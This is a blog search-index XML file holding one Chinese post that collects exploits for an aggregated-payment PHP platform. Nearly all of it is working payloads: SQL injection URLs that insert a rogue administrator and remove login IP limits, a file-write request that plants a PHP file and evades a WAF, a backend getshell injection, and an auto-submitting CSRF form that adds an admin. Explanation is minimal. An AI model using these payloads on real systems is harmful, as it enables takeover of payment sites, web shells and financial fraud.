<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一聚合支付漏洞合集2</title>
      <link href="2020/10/10/%E4%B8%80%E8%81%9A%E5%90%88%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%862/"/>
      <url>2020/10/10/%E4%B8%80%E8%81%9A%E5%90%88%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%862/</url>
      
        <content type="html"><![CDATA[<hr><p>title:一聚合支付漏洞合集<br>date:2018-01-05 00:00:00</p><hr><h1 id="一聚合支付漏洞合集"><a href="#一聚合支付漏洞合集" class="headerlink" title="一聚合支付漏洞合集"></a>一聚合支付漏洞合集</h1><h2 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h2><h3 id="注入一"><a href="#注入一" class="headerlink" title="注入一"></a>注入一</h3><p><code>Pay_UPALIWAP_callbackurl.html?sdcustomno=1</code></p><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;Pay&amp;c&#x3D;UPALIWAP&amp;a&#x3D;callbackurl&amp;sdcustomno&#x3D;1%27</span><br><span class="line"></span><br><span class="line">&#x2F;index.php?m&#x3D;Pay&amp;c&#x3D;WftAliSm&amp;a&#x3D;callbackurl&amp;orderid&#x3D;1%27</span><br></pre></td></tr></table></figure><p>直接把引号带入了数据库</p><h3 id="注入二"><a href="#注入二" class="headerlink" title="注入二"></a>注入二</h3><p>需要代理账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php?m&#x3D;user&amp;c&#x3D;IntoPieces&amp;a&#x3D;ajaxGetIndustry</span><br><span class="line">DATA:</span><br><span class="line">id&#x3D;123&amp;name&#x3D;_log; insert%20into%20pay_admin%20(&#96;id&#96;,&#96;username&#96;,&#96;password&#96;,&#96;groupid&#96;)%20values%20(%27101%27,%27ok%27,%277aa5e695be95cdd64a88410a64dfe2c1%27,%271%27);--+</span><br></pre></td></tr></table></figure><h3 id="注入三"><a href="#注入三" class="headerlink" title="注入三"></a>注入三</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?m&#x3D;user&amp;c&#x3D;api&amp;a&#x3D;ajaxGetIndustry</span><br></pre></td></tr></table></figure><p>payload同上</p><h3 id="注入四"><a href="#注入四" class="headerlink" title="注入四"></a>注入四</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pay_Pay_getSignkey?code&#x3D;123*&amp;merid&#x3D;222</span><br></pre></td></tr></table></figure><h3 id="SQL注入添加管理员"><a href="#SQL注入添加管理员" class="headerlink" title="SQL注入添加管理员"></a>SQL注入添加管理员</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?m&#x3D;Pay&amp;c&#x3D;Alipage&amp;a&#x3D;callbackurl&amp;out_trade_no[0]&#x3D;exp&amp;out_trade_no[1]&#x3D;&#x3D;20190722230646541015;insert%20into%20pay_admin%20(&#96;id&#96;,&#96;username&#96;,&#96;password&#96;,&#96;groupid&#96;)%20values%20(%27801%27,%27admln%27,%277aa5e695be95cdd64a88410a64dfe2c1%27,%271%27);--+</span><br></pre></td></tr></table></figure><h3 id="SQL注入取消IP限制"><a href="#SQL注入取消IP限制" class="headerlink" title="SQL注入取消IP限制"></a>SQL注入取消IP限制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?m&#x3D;Pay&amp;c&#x3D;Alipage&amp;a&#x3D;callbackurl&amp;out_trade_no[0]&#x3D;exp&amp;out_trade_no[1]&#x3D;&#x3D;20190722230646541015;update%20pay_websiteconfig%20set%20login_ip%20&#x3D;%20%27%27%20where%20id&#x3D;1</span><br></pre></td></tr></table></figure><h2 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;pay&amp;c&#x3D;UPALIWAP&amp;a&#x3D;file_writeTxt&amp;filepath&#x3D;.&#x2F;coder.php&amp;source&#x3D;&lt;?php%20phpinfo();</span><br></pre></td></tr></table></figure><p>根目录生成 <code>coder.php</code> 内容为 <code>&lt;?php%20phpinfo();</code></p><p>绕过waf写入之转换为上传文件<br>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?m&#x3D;pay&amp;c&#x3D;UPALIWAP&amp;a&#x3D;file_writeTxt HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;73.0.3683.103 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: xxxxx</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;--------685764754</span><br><span class="line">Content-Length: 202</span><br><span class="line"></span><br><span class="line">----------685764754</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;filepath&quot;</span><br><span class="line"></span><br><span class="line">.&#x2F;coder.php</span><br><span class="line">----------685764754</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;source&quot;</span><br><span class="line"></span><br><span class="line">ssb&lt;?php phpinfo</span><br><span class="line">();&#x2F;&#x2F; 注意这里是将phpinfo与括弧分成了俩行</span><br><span class="line">----------685764754--</span><br></pre></td></tr></table></figure><h2 id="后台Getshell"><a href="#后台Getshell" class="headerlink" title="后台Getshell"></a>后台Getshell</h2><p>URL地址</p><p><code>manage_System_base.html</code></p><p>插入</p><p><code>&#39;,@copy($_REQUEST[x],$_REQUEST[c]),//</code></p><h2 id="CSRF添加管理员"><a href="#CSRF添加管理员" class="headerlink" title="CSRF添加管理员"></a>CSRF添加管理员</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body onload&#x3D;&quot;document.forms[0].submit();&quot;&gt;</span><br><span class="line">&lt;form  id&#x3D;&quot;form1&quot; name&#x3D;&quot;form1&quot; action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:93&#x2F;index.php&#x2F;luck_Admin_addAdmin.html&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;ok179&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;password&quot; value&#x3D;&quot;test123&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;reppassword&quot; value&#x3D;&quot;test123&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;groupid&quot; value&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
